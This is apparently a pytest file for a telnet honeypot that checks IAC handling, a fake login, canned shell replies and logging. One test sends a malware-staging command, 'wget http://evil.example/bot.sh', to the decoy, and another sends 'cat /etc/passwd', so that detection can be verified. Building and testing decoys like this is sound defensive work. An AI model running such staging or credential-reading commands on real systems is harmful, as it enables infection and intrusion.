"""Tests for the telnet decoy: IAC handling, login, fake shell."""

import socket
import time

from honeypot_server.core.logger import Logger, hash_credential
from honeypot_server.core.persona import Persona
from honeypot_server.protocols.base import build_server
from honeypot_server.protocols.telnet import (
    DO,
    DONT,
    IAC,
    OPT_ECHO,
    OPT_LINEMODE,
    SB,
    SE,
    TelnetHandler,
    WILL,
    strip_iac,
)

PERSONA = Persona.generate(61)


def _start(tmp_path):
    logger = Logger(tmp_path / "telnet.jsonl")
    server = build_server(TelnetHandler, "127.0.0.1", 0, logger,
                          persona=PERSONA, start=True)
    return server, logger, server.server_address[1]


class TelnetClient:
    """Reads until an expected prompt fragment appears."""

    def __init__(self, port):
        self.sock = socket.create_connection(("127.0.0.1", port), timeout=3)
        self.buf = b""

    def read_until(self, fragment: bytes, timeout=3.0) -> bytes:
        self.sock.settimeout(timeout)
        deadline = time.time() + timeout
        while fragment not in self.buf:
            if time.time() > deadline:
                raise TimeoutError(f"missing {fragment!r} in {self.buf!r}")
            try:
                data = self.sock.recv(4096)
            except (socket.timeout, TimeoutError):
                raise TimeoutError(f"missing {fragment!r} in {self.buf!r}")
            if not data:
                raise EOFError(f"closed, have {self.buf!r}")
            self.buf += data
        out = self.buf
        self.buf = b""
        return out

    def send_line(self, text: str):
        self.sock.sendall(text.encode() + b"\r\n")

    def close(self):
        self.sock.close()


def _wait_for(log, needle, timeout=3.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if log.exists() and needle in log.read_text(encoding="utf-8"):
            return True
        time.sleep(0.05)
    return False


class TestStripIac:
    def test_plain_text_passthrough(self):
        clean, neg = strip_iac(b"hello world")
        assert clean == b"hello world" and neg == []

    def test_negotiation_extracted(self):
        data = bytes([IAC, DO, OPT_ECHO]) + b"ls"
        clean, neg = strip_iac(data)
        assert clean == b"ls"
        assert neg == [(DO, OPT_ECHO)]

    def test_escaped_iac(self):
        clean, neg = strip_iac(bytes([IAC, IAC]) + b"x")
        assert clean == bytes([IAC]) + b"x" and neg == []

    def test_subnegotiation_skipped(self):
        data = bytes([IAC, SB, OPT_LINEMODE, 1, 0, IAC, SE]) + b"whoami"
        clean, neg = strip_iac(data)
        assert clean == b"whoami" and neg == []

    def test_truncated_iac(self):
        clean, neg = strip_iac(b"ab" + bytes([IAC]))
        assert clean == b"ab"


class TestTelnetSession:
    def _login(self, c: TelnetClient, user="root", password="12345"):
        c.read_until(b"login: ")
        c.send_line(user)
        c.read_until(b"Password: ")
        c.send_line(password)
        return c.read_until(b"$ ")

    def test_login_and_shell_prompt(self, tmp_path):
        server, logger, port = _start(tmp_path)
        try:
            c = TelnetClient(port)
            out = self._login(c)
            assert b"Welcome" in out
            assert PERSONA.hostname.encode() in out
            c.close()
            assert _wait_for(logger.path, "login_success")
            assert _wait_for(logger.path, hash_credential("12345"))
        finally:
            server.shutdown(); server.server_close()

    def test_canned_commands(self, tmp_path):
        server, logger, port = _start(tmp_path)
        try:
            c = TelnetClient(port)
            self._login(c, user="bot")
            c.send_line("whoami")
            assert b"bot" in c.read_until(b"$ ")
            c.send_line("uname -a")
            out = c.read_until(b"$ ")
            assert b"Linux" in out and PERSONA.kernel.encode() in out
            c.send_line("ls")
            assert b"busybox" in c.read_until(b"$ ")
            c.send_line("cat /etc/passwd")
            out = c.read_until(b"$ ")
            assert b"root:x:0:0" in out
            c.send_line("ifconfig")
            assert PERSONA.ip_story.encode() in c.read_until(b"$ ")
            c.send_line("ps")
            assert b"telnetd" in c.read_until(b"$ ")
            c.send_line("busybox")
            assert b"BusyBox" in c.read_until(b"$ ")
            c.send_line("nope")
            assert b"not found" in c.read_until(b"$ ")
            c.close()
        finally:
            server.shutdown(); server.server_close()

    def test_wget_flagged_as_staging(self, tmp_path):
        server, logger, port = _start(tmp_path)
        try:
            c = TelnetClient(port)
            self._login(c)
            c.send_line("wget http://evil.example/bot.sh")
            out = c.read_until(b"$ ")
            assert b"200 OK" in out
            c.close()
            assert _wait_for(logger.path, "malware_staging")
            assert _wait_for(logger.path, "download_request")
        finally:
            server.shutdown(); server.server_close()

    def test_iac_from_client_handled(self, tmp_path):
        server, logger, port = _start(tmp_path)
        try:
            c = TelnetClient(port)
            c.read_until(b"login: ")
            # client sends its own negotiation inline with the username
            c.sock.sendall(bytes([IAC, DO, OPT_ECHO]) + b"admin\r\n")
            c.read_until(b"Password: ")
            c.send_line("pw")
            c.read_until(b"$ ")
            c.close()
            assert _wait_for(logger.path, "\"user\": \"admin\"")
        finally:
            server.shutdown(); server.server_close()

    def test_session_summary_logged(self, tmp_path):
        server, logger, port = _start(tmp_path)
        try:
            c = TelnetClient(port)
            self._login(c)
            c.send_line("whoami")
            c.read_until(b"$ ")
            c.send_line("exit")
            time.sleep(0.2)
            c.close()
            assert _wait_for(logger.path, "session_summary")
        finally:
            server.shutdown(); server.server_close()
